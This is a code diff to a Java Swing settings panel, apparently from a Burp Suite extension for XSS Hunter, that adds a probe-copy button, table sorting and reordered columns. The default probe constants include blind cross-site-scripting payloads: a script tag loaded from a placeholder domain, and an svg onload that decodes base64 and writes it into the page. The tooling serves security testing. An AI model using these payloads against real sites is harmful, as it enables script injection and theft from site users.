@@ -33,6 +33,10 @@ import javax.swing.JTable;
 import javax.swing.event.TableModelEvent;
 import javax.swing.event.TableModelListener;
 import javax.swing.table.DefaultTableModel;
+import javax.swing.table.TableRowSorter;
+import javax.swing.table.TableModel;
+import javax.swing.RowSorter;
+import javax.swing.SortOrder;
 
 /**
  *
@@ -104,6 +108,7 @@ public class HunterConfig extends JPanel implements ITab {
         jSeparator2 = new javax.swing.JSeparator();
         addProbe = new javax.swing.JButton();
         editProbe = new javax.swing.JButton();
+        copyProbe = new javax.swing.JButton();
         delProbe = new javax.swing.JButton();
         jScrollPane1 = new javax.swing.JScrollPane();
         probeTable = new javax.swing.JTable();
@@ -234,6 +239,13 @@ public class HunterConfig extends JPanel implements ITab {
             }
         });
 
+        copyProbe.setText("Copy");
+        copyProbe.addActionListener(new java.awt.event.ActionListener() {
+            public void actionPerformed(java.awt.event.ActionEvent evt) {
+                copyProbeAction(evt);
+            }
+        });
+
         delProbe.setText("Remove");
         delProbe.addActionListener(new java.awt.event.ActionListener() {
             public void actionPerformed(java.awt.event.ActionEvent evt) {
@@ -242,7 +254,7 @@ public class HunterConfig extends JPanel implements ITab {
         });
 
         probeTable.setModel(new DefaultTableModel(new Object [][] {},
-            new String [] {"Enabled", "Probe Variable", "Base64 Injection", "Payload"}) {
+            new String [] {"Enabled", "Probe Variable", "Payload", "Base64 Injection"}) {
             Class[] types = new Class [] {
                 java.lang.Boolean.class, java.lang.String.class, java.lang.String.class, java.lang.String.class
             };
@@ -259,10 +271,17 @@ public class HunterConfig extends JPanel implements ITab {
         probeTable.getColumnModel().getColumn(1).setMinWidth(100);
         probeTable.getColumnModel().getColumn(1).setMaxWidth(150);
         DefaultTableModel model = (DefaultTableModel) probeTable.getModel();
+
+        TableRowSorter<TableModel> sorter = new TableRowSorter<TableModel>(model);
+        probeTable.setRowSorter(sorter);
+        List<RowSorter.SortKey> sortKeys = new ArrayList<>(25);
+        sortKeys.add(new RowSorter.SortKey(1, SortOrder.ASCENDING));
+        sorter.setSortKeys(sortKeys);
+
         if (prop.containsKey("probes")) {
             probes = new ArrayList<String>(Arrays.asList(prop.getProperty("probes").replace(" ", "").replace("[", "").replace("]", "").split(",")));
             for (String probe : probes) {
-                model.addRow(new Object[]{Boolean.parseBoolean(prop.getProperty("probe["+probe+"][enabled]")), probe, prop.getProperty("probe["+probe+"][base64]"), prop.getProperty("probe["+probe+"][inject]")});
+                model.addRow(new Object[]{Boolean.parseBoolean(prop.getProperty("probe["+probe+"][enabled]")), probe, prop.getProperty("probe["+probe+"][inject]"), prop.getProperty("probe["+probe+"][base64]")});
             }
         } else {
             probes = new ArrayList<String>(Arrays.asList("alpha", "beta"));
@@ -270,11 +289,11 @@ public class HunterConfig extends JPanel implements ITab {
             String alphaInject = "\"><script%20src=https://[DOMAIN]></script>";
             String betaBase = "<script src=https://[DOMAIN]></script>";
             String betaInject = "<svg/onload=document.write(atob(this.id))%20id=[BASE64]>";
-            model.addRow(new Object[]{true, "alpha", "", alphaInject});
+            model.addRow(new Object[]{true, "alpha", alphaInject, ""});
             prop.setProperty("probe[alpha][enabled]", "true");
             prop.setProperty("probe[alpha][base64]", "");
             prop.setProperty("probe[alpha][inject]", alphaInject);
-            model.addRow(new Object[]{true, "beta", betaBase, betaInject});
+            model.addRow(new Object[]{true, "beta", betaInject, betaBase});
             prop.setProperty("probe[beta][enabled]", "true");
             prop.setProperty("probe[beta][base64]", betaBase);
             prop.setProperty("probe[beta][inject]", betaInject);
@@ -330,7 +349,8 @@ public class HunterConfig extends JPanel implements ITab {
                         .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                             .addComponent(editProbe, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                             .addComponent(delProbe, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
-                            .addComponent(addProbe, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
+                            .addComponent(addProbe, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
+                            .addComponent(copyProbe, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                         .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                         .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 473, Short.MAX_VALUE))
                     .addGroup(layout.createSequentialGroup()
@@ -378,6 +398,8 @@ public class HunterConfig extends JPanel implements ITab {
                         .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                         .addComponent(editProbe)
                         .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
+                        .addComponent(copyProbe)
+                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                         .addComponent(delProbe)
                         .addGap(0, 0, Short.MAX_VALUE))
                     .addComponent(jScrollPane1, javax.swing.GroupLayout.DEFAULT_SIZE, 325, Short.MAX_VALUE))
@@ -389,6 +411,9 @@ public class HunterConfig extends JPanel implements ITab {
     }// </editor-fold>//GEN-END:initComponents
 
     private void cancelProbe(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_cancelProbe
+        newProbe.setText("");
+        newInject.setText("");
+        newBase.setText("");
         probeDialogue.dispose();
     }//GEN-LAST:event_cancelProbe
 
@@ -399,20 +424,21 @@ public class HunterConfig extends JPanel implements ITab {
     }//GEN-LAST:event_addProbeAction
 
     private void probeAdd(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_probeAdd
+        int select = probeTable.getSelectedRow();
         DefaultTableModel model = (DefaultTableModel) probeTable.getModel();
         String probe = newProbe.getText();
         if (createProbe) {
-            model.addRow(new Object[]{true, probe, newBase.getText(), newInject.getText()});
+            model.addRow(new Object[]{true, probe, newInject.getText(), newBase.getText()});
         } else {
             String oldProbe = probeTable.getValueAt(probeTable.getSelectedRow(), 1).toString();
             probes.remove(oldProbe);
             prop.remove("probe["+oldProbe+"][enabled]");
             prop.remove("probe["+oldProbe+"][base64]");
             prop.remove("probe["+oldProbe+"][inject]");
-            model.setValueAt(true, probeTable.getSelectedRow(), 0);
-            model.setValueAt(probe, probeTable.getSelectedRow(), 1);
-            model.setValueAt(newBase.getText(), probeTable.getSelectedRow(), 2);
-            model.setValueAt(newInject.getText(), probeTable.getSelectedRow(), 3);
+            model.setValueAt(true, probeTable.convertRowIndexToModel(select), 0);
+            model.setValueAt(probe, probeTable.convertRowIndexToModel(select), 1);
+            model.setValueAt(newInject.getText(), probeTable.convertRowIndexToModel(select), 2);            
+            model.setValueAt(newBase.getText(), probeTable.convertRowIndexToModel(select), 3);            
         }
         probes.add(probe);
         prop.setProperty("probes", probes.toString());
@@ -442,16 +468,28 @@ public class HunterConfig extends JPanel implements ITab {
             probeDialogue.setVisible(true);
             probeDialogue.setTitle("Edit XSS Hunter Probe");
             newProbe.setText(probeTable.getValueAt(select, 1).toString());
-            newBase.setText(probeTable.getValueAt(select, 2).toString());
-            newInject.setText(probeTable.getValueAt(select, 3).toString());
+            newBase.setText(probeTable.getValueAt(select, 3).toString());
+            newInject.setText(probeTable.getValueAt(select, 2).toString());
         }
     }//GEN-LAST:event_editProbeAction
+
+    private void copyProbeAction(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_copyProbeAction
+        int select = probeTable.getSelectedRow();
+        if (select != -1) {
+            createProbe = true;
+            probeDialogue.setVisible(true);
+            probeDialogue.setTitle("Edit XSS Hunter Probe");
+            newProbe.setText(probeTable.getValueAt(select, 1).toString()+"(1)");
+            newBase.setText(probeTable.getValueAt(select, 3).toString());
+            newInject.setText(probeTable.getValueAt(select, 2).toString());
+        }
+    }//GEN-LAST:event_copyProbeAction
 
     private void delProbeAction(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_delProbeAction
         int select = probeTable.getSelectedRow();
         String probe = probeTable.getValueAt(select, 1).toString();
         DefaultTableModel model = (DefaultTableModel) probeTable.getModel();
-        model.removeRow(select);
+        model.removeRow(probeTable.convertRowIndexToModel(select));
         probes.remove(probe);
         prop.setProperty("probes", probes.toString());
         prop.remove("probe["+probe+"][enabled]");
@@ -494,9 +532,9 @@ public class HunterConfig extends JPanel implements ITab {
         }
     }//GEN-LAST:event_hunterKeyFocusLost
 
-
     // Variables declaration - do not modify//GEN-BEGIN:variables
     private javax.swing.JButton addProbe;
+    private javax.swing.JButton copyProbe;
     private javax.swing.JButton delProbe;
     private javax.swing.JButton editProbe;
     private javax.swing.JTextField hunterDomain;
